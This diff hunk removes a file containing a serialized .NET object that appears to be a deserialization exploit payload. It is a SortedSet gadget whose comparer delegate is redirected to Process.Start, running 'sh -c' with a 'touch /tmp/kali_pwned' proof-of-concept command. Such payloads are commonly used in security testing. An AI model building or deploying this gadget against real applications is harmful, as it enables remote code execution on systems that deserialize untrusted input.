@@ -1,11 +1,0 @@
-    ÿÿÿÿ          ISystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089   „System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]   CountComparerVersionItems  System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]      	      	      System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]   _comparison"System.DelegateSerializationHolder	            '-c /bin/bash -c 'touch /tmp/kali_pwned'   sh    "System.DelegateSerializationHolder   Delegatemethod0method10System.DelegateSerializationHolder+DelegateEntry/System.Reflection.MemberInfoSerializationHolder/System.Reflection.MemberInfoSerializationHolder	   		   	
-      0System.DelegateSerializationHolder+DelegateEntry   typeassemblytargettargetTypeAssemblytargetTypeName
-methodNamedelegateEntry0System.DelegateSerializationHolder+DelegateEntry   °System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]   Kmscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
-   ISystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089   System.Diagnostics.Process   Start	   	   /System.Reflection.MemberInfoSerializationHolder   NameAssemblyName	ClassName	Signature
-Signature2
-MemberTypeGenericArguments System.Type[]	   	   	      >System.Diagnostics.Process Start(System.String, System.String)   >System.Diagnostics.Process Start(System.String, System.String)   
-
-   	      Compare	      System.String   +Int32 Compare(System.String, System.String)   2System.Int32 Compare(System.String, System.String)   
-         qSystem.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]	   
-	   	   	   
-
